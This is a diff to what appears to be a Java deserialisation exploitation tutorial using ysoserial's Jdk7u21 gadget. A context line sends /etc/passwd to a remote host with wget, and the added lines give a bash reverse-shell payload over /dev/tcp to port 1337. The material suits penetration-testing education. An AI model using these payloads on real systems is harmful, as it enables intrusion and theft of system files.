@@ -215,4 +215,13 @@ java -jar ysoserial-master-SNAPSHOT.jar Jdk7u21 "wget --post-file /etc/passwd  h
 
 Step 1: Send the vulnerable request to **DS - Exploitation Tab**
 
-Step 2: Using the following command to gain a **Reverse Shell** and Read Internal Files of the application.
+Step 2: Using the following command to gain a **Reverse Shell**.
+
+```bash
+Jdk7u21 "/bin/bash -c /bin/bash${IFS}-i>&/dev/tcp/ipaddress/1337<&1"
+```
+
+<p align="center">
+  <img src="/images/deserialisation/desc24.png">
+</p>
+
